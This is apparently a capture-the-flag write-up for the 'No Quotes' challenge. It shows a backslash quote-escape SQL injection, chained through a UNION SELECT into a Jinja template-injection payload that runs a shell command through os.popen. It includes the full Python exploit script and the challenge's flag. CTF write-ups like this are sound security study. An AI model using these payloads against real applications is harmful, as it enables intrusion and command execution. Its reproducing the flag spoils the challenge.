---
created: 2026-01-11T23:41
updated: 2026-01-12T00:21
solves: 407
points: 37
title: No Quotes
---

The challenge is SQL injection, but username and password cannot have quotes. The returned username from the SQL query is rendered as template so we need a SSTI payload in it.

```python
query = (
	"SELECT id, username FROM users "
	f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

To escape out of the quotes, we can use `\` in username to escape the ending single quote. The rest is pretty simple (after fiddling with the SQL because it is not returning the row I want for some reason I had to use `limit 1,1`).

```python
import requests
target = "https://no-quotes-7398bc3120f57dc9.chals.uoftctf.org"
# target = "http://127.0.0.1:5000"
# ssti
payload = b"{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
print(payload.hex())
r = requests.post(f"{target}/login", data={
    "username": "wwww\\",
    "password": " OR 1=0) UNION SELECT 1,0x"+payload.hex()+" LIMIT 1,1-- "
})
print(r.text)
```

And we have the flag.

```flag
uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}
```

... and when I tried to submit the flag I realised that @aelmo already solved it 😭

Part 2 is SQL quine, I was making progress but @aelmo solved it again 😭

... and part 3 is hash quine, I have no idea.
